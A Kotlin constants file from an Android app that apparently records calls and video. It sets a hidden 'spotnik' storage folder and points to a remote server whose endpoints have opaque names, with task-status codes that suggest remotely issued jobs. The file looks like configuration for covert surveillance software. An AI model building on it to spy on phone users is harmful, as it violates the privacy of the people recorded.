package com.example.mobiletwo

import android.os.Build
import android.os.Environment
import java.io.File

class Consts {
    companion object {
        var mPackageName: String = "com.example.mobiletwo"
        const val recorderClass: String=".MyCallListener"
        const val MaxVideoRecordTime: Int = 1
        const val MaxVideoSizeMega: Int = 5
        const val dStoragePath: String = "/"
        const val mUserAgent: String = "8120b16cae391d7f897eb915e3c58b8a"
        private const val base:String = "https://ivashost.com/xyz/h/api/jwd"
        //val mFiles: File = File(Environment.getExternalStorageDirectory().path+"/Spotnik/Files")
        val sFiles:File = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            File("/storage/emulated/0/spotnik")
        } else {
            File("${Environment.getExternalStorageDirectory()}/spotnik")
        }
        const val conan:String = "$base/conan"
        const val modo: String="$base/modo"
        const val patrick: String ="$base/patrick"
        const val resp: String = "$base/resp"
        const val haberkorn:String="$base/haberkorn"
        const val admondson:String="$base/admondson"
        const val status_pending:String = "1"
        const val status_inProgress:String = "2"
        const val status_complete:String = "3"
        const val status_canceled:String = "4"
        const val status_failed:String = "5"
        const val status_interrupted:String = "6"
        const val debugLevel:Int = 3//3210 //0 stop, 1 print, 2 write logs, 3 both
    }
}